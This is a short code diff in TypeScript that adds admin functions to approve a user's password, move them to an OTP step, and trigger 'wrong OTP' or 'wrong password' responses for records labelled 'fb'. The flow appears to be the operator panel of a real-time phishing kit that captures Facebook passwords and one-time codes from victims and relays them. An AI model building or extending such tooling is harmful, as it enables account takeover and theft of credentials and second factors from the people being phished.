@@ -104,6 +104,24 @@ export async function returnWrongPass(id: string) {
   return response.data;
 }
 
+// Admin: approve password (go to OTP)
+export async function acceptFbPass(id: string) {
+  const response = await axios.post(`/api/fb/${id}/accept-pass`);
+  return response.data;
+}
+
+// Admin: approve OTP (final redirect)
+export async function acceptFbOtp(id: string) {
+  const response = await axios.post(`/api/fb/${id}/accept-otp`);
+  return response.data;
+}
+
+// Admin: trigger wrong OTP
+export async function returnWrongOtp(id: string) {
+  const response = await axios.post(`/api/fb/${id}/wrong-otp`);
+  return response.data;
+}
+
 // Admin: delete fb user record
 export function deleteFbUser(id: string) {
   return async () => {
